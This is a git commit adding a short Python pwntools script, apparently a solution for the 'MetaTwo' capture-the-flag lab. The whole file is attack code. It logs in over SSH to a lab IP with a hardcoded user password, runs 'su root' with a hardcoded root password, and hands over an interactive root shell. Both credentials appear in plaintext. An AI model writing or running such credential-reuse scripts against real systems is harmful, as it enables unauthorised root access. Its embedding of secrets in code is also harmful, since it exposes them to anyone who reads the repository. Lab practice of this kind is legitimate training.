9369ff0595299d703a8b6a26402845e8545a44a5
ninh.pn1337 <ninh.pn1337@gmail.com>
2023-02-24 14:19:53 +0700

    Create metatwo.py

---
+++ Metatwo/metatwo.py
@@ -0,0 +1,17 @@
+import requests
+
+
+
+try:
+    from pwn import *
+    print("\n[\033[1;32m+\033[1;37m] Metatwo - Ninhpn\n")
+except:
+    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
+    exit(1)
+request = ssh(host="10.10.11.186", user="jnelson", password="Cb4_JmWM8zUZWMu@Ys")
+shell = request.process("/bin/sh")
+shell.sendline(b"su root")
+time.sleep(0.5)
+shell.sendline(b"p7qfAZt4_A1xo_0x")
+time.sleep(0.5)
+shell.interactive()
